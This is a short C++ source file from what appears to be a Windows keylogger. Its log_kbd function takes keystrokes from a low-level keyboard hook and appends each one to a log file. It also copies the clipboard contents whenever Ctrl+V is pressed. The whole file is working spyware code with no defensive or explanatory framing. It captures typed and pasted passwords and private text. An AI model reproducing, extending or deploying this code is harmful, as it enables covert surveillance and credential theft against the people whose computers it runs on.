#include "keylogger.hpp"
#include "keyboard.hpp"
#include "configuration.hpp"
#include "clipboard.hpp"
#include "constants.hpp"

// Logs the respective characters of the provided KBD hook.
void keylogger::log_kbd(const KBDLLHOOKSTRUCT* kbd_hook)
{
    static std::wofstream out_file{ configuration::out_file, std::wofstream::app };

    const auto it = configuration::key_codes.find(kbd_hook->vkCode);

    // If the virtual-key code is in the key_codes map, write the respective value.
    if (it != configuration::key_codes.end())
    {
        out_file << it->second;
    }
    // If the control key is down, write the provided virtual-key code and write the
    // clipboard data in the case of CTRL + V.
    else if (keyboard::is_down(VK_CONTROL))
    {
        out_file << L"[CTRL + " << static_cast<WCHAR>(kbd_hook->vkCode) << L']';

        if (kbd_hook->vkCode == VK_V)
        {
            out_file << clipboard::get_data();
        }
    }
    else
    {
        out_file << keyboard::kbd_to_unicode(kbd_hook);
    }

    // Write all changes to the wofstream.
    out_file << std::flush;
}
